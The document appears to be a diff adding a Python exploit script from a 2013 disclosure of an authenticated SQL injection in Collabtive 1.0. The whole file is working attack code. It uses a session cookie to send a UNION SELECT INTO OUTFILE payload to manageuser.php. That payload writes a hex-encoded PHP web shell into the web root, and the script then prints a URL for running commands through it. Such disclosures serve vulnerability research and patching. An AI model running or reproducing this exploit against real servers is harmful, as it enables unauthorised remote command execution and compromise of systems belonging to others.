@@ -1,0 +1,61 @@
+# Exploit Title: Collabtive 1.0 SQLi
+# Date: 06/17/2013
+# Exploit Author: drone (@dronesec)
+# More information: http://forelsec.blogspot.com/2013/06/collabtive-10-sqli.html
+# Vendor homepage: http://collabtive.o-dyn.de/
+# Software link: http://downloads.sourceforge.net/project/collabtive/collabtive/1.0/collabtive-10.zip
+# Version: 1.0
+# Fixed In: https://github.com/philippK-de/Collabtive 
+# Tested on: Ubuntu 12.04 (apparmor disabled)
+
+""" Collabtive 1.0 SQL injection web shell
+
+    Requires authenticated user.
+"""
+from argparse import ArgumentParser
+import string
+import random
+import urllib, urllib2
+import sys
+
+def run(options):
+    print '[!] Dropping web shell on %s...'%options.ip
+
+    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
+
+    # <? php system($_GET["rr"]); ?>
+    exploit = '{0}%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'\
+              '%20INTO%20OUTFILE%20\'{1}/{2}.php\''.format(options.task,options.path,shell)
+
+    query_string = 'action=profile&id={0}&project={1}&task={2}'.format(options.id,options.project,
+                                                                        exploit)
+    request = urllib2.build_opener()
+    request.addheaders.append(('Cookie', 'PHPSESSID=%s'%options.session.strip()))
+
+    try:
+        request.open('http://{0}{1}/manageuser.php?{2}'.format(
+                                                options.ip, options.rootp,query_string))
+    except: pass
+    print '[!] Shell dropped.  http://{0}{1}/{2}.php?rr=ls'.format(options.ip, options.rootp, shell)
+def parse():
+    parser = ArgumentParser()
+    parser.add_argument("-i", help='server address', action='store', dest='ip', required=True)
+    parser.add_argument('-P', help='valid php session id', action='store',
+                        dest='session', required=True)
+    parser.add_argument("-p", help='path to manageuser.php (/collabtive)',action='store',
+                        default='/collabtive', dest='rootp')
+    parser.add_argument("-w", help="writable web path (/var/www/collabtive)",action='store',
+                        default='/var/www/collabtive', dest='path')
+    parser.add_argument('--id', help='collab id (1)', action='store', default=1, dest='id')
+    parser.add_argument('--project', help='project id (1)', action='store', default=1,
+                        dest='project')
+    parser.add_argument('--task', help='task id (1)', action='store', default=1,
+                        dest='task')
+
+    options = parser.parse_args()
+    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
+    options.rootp = options.rootp if options.rootp[-1] != '/' else options.rootp[:-1]
+    return options
+
+if __name__=="__main__":
+    run(parse())
